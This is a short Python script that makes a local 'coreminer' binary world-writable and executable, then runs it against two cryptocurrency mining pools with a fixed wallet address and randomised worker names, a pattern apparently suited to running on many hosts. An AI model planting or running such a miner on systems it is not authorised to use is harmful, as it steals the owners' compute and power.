import sys
import os
os.system('chmod 777 coreminer')
os.system('./coreminer -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008 -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@us.catchthatrabbit.com:8008')
